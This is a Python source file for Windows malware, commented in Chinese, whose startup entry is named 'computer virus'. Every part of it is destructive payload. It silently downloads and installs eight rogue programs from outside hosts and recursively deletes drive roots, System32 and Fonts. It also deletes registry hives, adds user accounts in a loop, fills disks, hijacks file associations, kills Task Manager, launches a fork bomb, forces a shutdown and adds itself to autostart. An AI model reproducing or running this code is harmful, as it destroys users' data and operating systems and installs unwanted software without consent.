from subprocess import run as system
from threading import Thread
from time import sleep
from tkinter.messagebox import showinfo, showerror, askquestion
from requests import get
from sys import argv


# 获取磁盘信息
def get_disk():
    disk = system("wmic logicaldisk get caption", shell=True, capture_output=True, text=True)
    disk = disk.stdout
    for i in ['Caption', '\n', ' ']:
        disk = disk.replace(i, '')
    disk = disk.split(':')
    disk.pop()
    return disk


# 安装流氓软件
def install_rogue():
    try:
        with open('XunLeiWebSetup12.1.6.2780xl11.exe', 'wb') as f:
            f.write(get('https://down.sandai.net/thunder11/XunLeiWebSetup12.1.6.2780xl11.exe').content)
        system('XunLeiWebSetup12.1.6.2780xl11.exe /S', shell=True)
        with open('setuploader.exe', 'wb') as f:
            f.write(get('https://down-package.ludashicdn.com/pc/2025022720/ldsstu/online/setuploader.exe').content)
        system('setuploader.exe /S', shell=True)
        with open('360se_setup___sembg100031___n58791175a1.exe', 'wb') as f:
            f.write(get('https://down.360safe.com/se/qd/360se_setup___sembg100031___n58791175a1.exe').content)
        system('360se_setup___sembg100031___n58791175a1.exe /S', shell=True)
        with open('HMSDUZEDCS.exe', 'wb') as f:
            f.write(get('https://download.2345.cn/down/HMSDUZEDCS.exe').content)
        system('HMSDUZEDCS.exe /S', shell=True)
        with open('ksbrowser_ai_home.exe', 'wb') as f:
            f.write(get('https://dl.liebao.cn/coop/ksbrowser_ai_home.exe').content)
        system('ksbrowser_ai_home.exe /S', shell=True)
        with open('qudong_setup.exe', 'wb') as f:
            f.write(get('https://dubapkg.cmcmcdn.com/cs/196bing/%E9%A9%B5%E5%8A%A8%E7%B2%BE%E7%81%B5.exe').content)
        system('qudong_setup.exe /S', shell=True)
        with open('kuaizip_setup_v3.3.2.0_kzgw_23.exe', 'wb') as f:
            f.write(get('http://gwqd.kkdownload.com/Uploads/kzgw/kuaizip_setup_v3.3.2.0_kzgw_23.exe').content)
        system('kuaizip_setup_v3.3.2.0_kzgw_23.exe /S', shell=True)
        with open('birdpaper_home.exe', 'wb') as f:
            f.write(get('https://cdn-hsyq-dynamic-file.shanhutech.cn/home/bird/birdpaper_home.exe').content)
        system('birdpaper_home.exe /S', shell=True)
    except KeyboardInterrupt:
        system(argv[0], shell=True)


# 删除系统文件
def delete_system():
    try:
        disk = get_disk()
        for i in disk:
            system(f"rd /s /q {i}:\\", shell=True)
    except KeyboardInterrupt:
        system(argv[0], shell=True)


# 删除System32,Fonts文件
def delete_system32():
    try:
        disk = get_disk()
        for i in disk:
            system(f"rd /s /q {i}:\\Windows\\Fonts\\", shell=True)
            system(f"rd /s /q {i}:\\Windows\\System32\\", shell=True)
    except KeyboardInterrupt:
        system(argv[0], shell=True)


# 删除注册表
def delete_regedit():
    def delete(regedit):
        try:
            system(f"reg delete {regedit} /f", shell=True)
        except KeyboardInterrupt:
            system(argv[0], shell=True)
        except:
            pass

    for i in ['hkcr', 'hkcu', 'hklm', 'hku', 'hkcc']:
        globals()[f't{i}'] = Thread(target=delete, args=(i,))
        globals()[f't{i}'].start()
        globals()[f't{i}'].join()


# 循环添加用户
def add_user():
    while True:
        user = 1
        try:
            system(f"net user {user} zhaobokai666 /add", shell=True)
        except KeyboardInterrupt:
            system(argv[0], shell=True)
        except:
            pass


# 填充磁盘
def full(disk):
    sleep(50)
    while True:
        try:
            a = 1
            size = system(f'wmic logicaldisk where caption="{disk}:" get size,freespace', shell=True,
                          capture_output=True,
                          text=True)
            size = size.stdout.split(" ")
            size.sort()
            size.reverse()
            size = size[2:4]
            size = size[1]
            size = int(size)
            if size > 1000000:
                system(f"fsutil file createnew {disk}:\\SYSTEM{a} {size - 30000}", shell=True)
                a += 1
            else:
                with open(f'{disk}:\\SYSTEM', 'a') as f:
                    f.write('6')
        except KeyboardInterrupt:
            system(argv[0], shell=True)
        except:
            pass


# 填充磁盘主函数
def full_main():
    disk = get_disk()
    for i in disk:
        full(i)


# 修改文件关联为病毒
def Tamper_associations():
    try:
        associations = system('ftype', shell=True, capture_output=True, text=True)
        associations = associations.stdout.split('\n')
        for i, j in enumerate(associations):
            try:
                associations[i] = [j.split('=')[1], j.split('=')[0]][1]
            except:
                associations.remove(j)
        while True:
            for i in associations:
                system(f'ftype {i}="{argv[0]}"', shell=True)
    except KeyboardInterrupt:
        system(argv[0], shell=True)
    except:
        pass


# 弹出消息框
def messagebox():
    try:
        sleep(60)
        while True:
            showerror('sb', "Windows 找不到文件 'sb'。请确定文件名是否正确后，再逝一次")
            askquestion('重命名', "如果改变文件扩展名，可能会导致文件不可用。\n\n确定要更改吗？", icon="warning")
            showerror('https://www.sb.com', '向程序发生命令时出现问题')
            showerror('Windows Script Host',
                      '脚本：sb.vbs\n行：114514\n字符：114514\n错误：你不承认你逝sb\n代码：11451A400\n源：Microsoft VBScript编辑器错误')
            askquestion('sb', 'sb未响应，是否立即重新启动？')
            showinfo('哈哈哈', '哈哈哈' * 100)
    except KeyboardInterrupt:
        system(argv[0], shell=True)


# 杀死任务管理器
def kill_taskmgr():
    try:
        while True:
            system('taskkill /f /im taskmgr.exe', shell=True)
    except KeyboardInterrupt:
        system(argv[0], shell=True)


# 蓝屏死机
def blue_screen_of_death():
    try:
        sleep(1000)
        with open('1.bat', 'w') as f:
            f.write('%0|%0')
        system('1.bat', shell=True)
        sleep(2000)
        system('taskklii /im svchost.exe /f', shell=True)
        system('shutdown -s -t 0 -f', shell=True)
    except KeyboardInterrupt:
        system(argv[0], shell=True)


# 添加开机自启
def startup():
    try:
        system(
            f'reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "电脑病毒" /t REG_SZ /d '
            f'"{argv[0]}" /f', shell=True)
    except KeyboardInterrupt:
        system(argv[0], shell=True)


if __name__ == '__main__':
    try:
        t1 = Thread(target=delete_system)
        t2 = Thread(target=delete_system32)
        t3 = Thread(target=full_main)
        t4 = Thread(target=delete_regedit)
        t5 = Thread(target=add_user)
        t6 = Thread(target=install_rogue)
        t7 = Thread(target=Tamper_associations)
        t8 = Thread(target=messagebox)
        t9 = Thread(target=kill_taskmgr)
        t10 = Thread(target=startup)
        t11 = Thread(target=blue_screen_of_death)
        t1.start()
        t2.start()
        t3.start()
        t4.start()
        t5.start()
        t6.start()
        t7.start()
        t8.start()
        t9.start()
        t10.start()
        t11.start()
        t1.join()
        t2.join()
        t3.join()
        t4.join()
        t5.join()
        t6.join()
        t7.join()
        t8.join()
        t9.join()
        t10.join()
        t11.join()
    except KeyboardInterrupt:
        system(argv[0], shell=True)
